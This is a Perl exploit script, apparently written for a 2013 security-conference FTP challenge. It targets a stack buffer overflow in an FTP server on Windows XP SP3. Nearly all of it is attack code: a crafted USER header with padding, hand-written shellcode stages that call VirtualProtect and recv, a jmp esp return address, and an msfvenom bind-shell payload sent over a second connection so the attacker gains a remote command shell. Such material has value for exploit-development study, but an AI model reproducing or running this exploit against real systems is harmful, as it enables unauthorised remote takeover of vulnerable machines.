#!/usr/bin/perl

# Inspired by OJ Reeves: https://buffered.io/posts/idsecconf-2013-myftpd-challenge/
# Developed against Windows XP Professional SP 3 English

use IO::Socket;

if($ARGV[0] eq ''){
die("Proper usage $0 IP_ADDRESS PORT_1 PORT_2\n\n");
}

$badheader = "USER /.:/";
$junk = "\x41" x 252;

# 351 bytes total buffer
# EIP offset = 280
# ESP offset = 288
# Earliest stack offset = 252

# setting up virtualprotect, preparing recv call, and then jumping to $block3
$block2 = "\x59\x51\x8B\xF0\x50\x66\xBB\xA4\x3E\x8D\x44\x24\xDC\x6A\x40\x51\x56\xFF\xD3\x56\x66\xBB\xDC\x82\x57\xeb\x05";
$block2 .= "\x42" x (28-length($block2));

$eip = "\xf7\x56\x44\x7e"; # jmp esp user32.dll

# call recv, JMP ESI (where payload was stored)
$block3 = "\xff\x13\xFF\xE6";

# first 4 bytes here are ESP overwrite and then socket, bind, listen, accept, malloc; jump $block2
$block1 = "\x83\xEC\x7C\xBB\x11\x34\x34\x40\xC1\xEB\x08\xB0\x06\xB0\x01\x40\x50\xFF\xD3\x8B\xF8\x8B\xCB\xB5\x74\xFE\x41".
"\x03\xB3\x54\x6A\x10\x51\x57\xFF\xD3\xB3\x5C\x6A\x7F\x57\xFF\xD3\xB3\x24\x57\xFF\xD3\x8B\xF8\x66\xBB\xD4\x3D\x8A\xE0\x50\xFF\xD3\xeb\x9F";
$block1 .= "\x45" x (63-length($block1));

# msfvenom -p windows/shell_bind_tcp LPORT=80 -b "\x00\x0a\x0d" -f perl -v payload EXITFUNC=seh
# Payload size: 355 bytes

$payload = "\xda\xd4\xd9\x74\x24\xf4\xba\xa3\xeb\x4d\xf9\x5e\x31\xc9" .
"\xb1\x53\x83\xee\xfc\x31\x56\x13\x03\xf5\xf8\xaf\x0c\x05" .
"\x16\xad\xef\xf5\xe7\xd2\x66\x10\xd6\xd2\x1d\x51\x49\xe3" .
"\x56\x37\x66\x88\x3b\xa3\xfd\xfc\x93\xc4\xb6\x4b\xc2\xeb" .
"\x47\xe7\x36\x6a\xc4\xfa\x6a\x4c\xf5\x34\x7f\x8d\x32\x28" .
"\x72\xdf\xeb\x26\x21\xcf\x98\x73\xfa\x64\xd2\x92\x7a\x99" .
"\xa3\x95\xab\x0c\xbf\xcf\x6b\xaf\x6c\x64\x22\xb7\x71\x41" .
"\xfc\x4c\x41\x3d\xff\x84\x9b\xbe\xac\xe9\x13\x4d\xac\x2e" .
"\x93\xae\xdb\x46\xe7\x53\xdc\x9d\x95\x8f\x69\x05\x3d\x5b" .
"\xc9\xe1\xbf\x88\x8c\x62\xb3\x65\xda\x2c\xd0\x78\x0f\x47" .
"\xec\xf1\xae\x87\x64\x41\x95\x03\x2c\x11\xb4\x12\x88\xf4" .
"\xc9\x44\x73\xa8\x6f\x0f\x9e\xbd\x1d\x52\xf7\x72\x2c\x6c" .
"\x07\x1d\x27\x1f\x35\x82\x93\xb7\x75\x4b\x3a\x40\x79\x66" .
"\xfa\xde\x84\x89\xfb\xf7\x42\xdd\xab\x6f\x62\x5e\x20\x6f" .
"\x8b\x8b\xdd\x67\x2a\x64\xc0\x8a\x8c\xd4\x44\x24\x65\x3f" .
"\x4b\x1b\x95\x40\x81\x34\x3e\xbd\x2a\x3a\xef\x48\xcc\x50" .
"\x1f\x1d\x46\xcc\xdd\x7a\x5f\x6b\x1d\xa9\xf7\x1b\x56\xbb" .
"\xc0\x24\x67\xe9\x66\xb2\xec\xfe\xb2\xa3\xf2\x2a\x93\xb4" .
"\x65\xa0\x72\xf7\x14\xb5\x5e\x6f\xb4\x24\x05\x6f\xb3\x54" .
"\x92\x38\x94\xab\xeb\xac\x08\x95\x45\xd2\xd0\x43\xad\x56" .
"\x0f\xb0\x30\x57\xc2\x8c\x16\x47\x1a\x0c\x13\x33\xf2\x5b" .
"\xcd\xed\xb4\x35\xbf\x47\x6f\xe9\x69\x0f\xf6\xc1\xa9\x49" .
"\xf7\x0f\x5c\xb5\x46\xe6\x19\xca\x67\x6e\xae\xb3\x95\x0e" .
"\x51\x6e\x1e\x30\xa3\xa2\x8b\xa5\x1a\x57\xf6\xab\x9c\x82" .
"\x35\xd2\x1e\x26\xc6\x21\x3e\x43\xc3\x6e\xf8\xb8\xb9\xff" .
"\x6d\xbe\x6e\xff\xa7";

$socket = IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[1]"
)or die("Could not connect to server");

$socket->recv($sd,1024);
print $sd;

$socket->send($badheader.$junk.$block2.$eip.$block3.$block1);

$socket->recv($sd2,1024);
print $sd2;
$socket->shutdown(SHUT_RDWR);

sleep(2);

$socket2 = IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[2]"
)or die("Could not connect to server to send payload");

$socket2->send($payload);
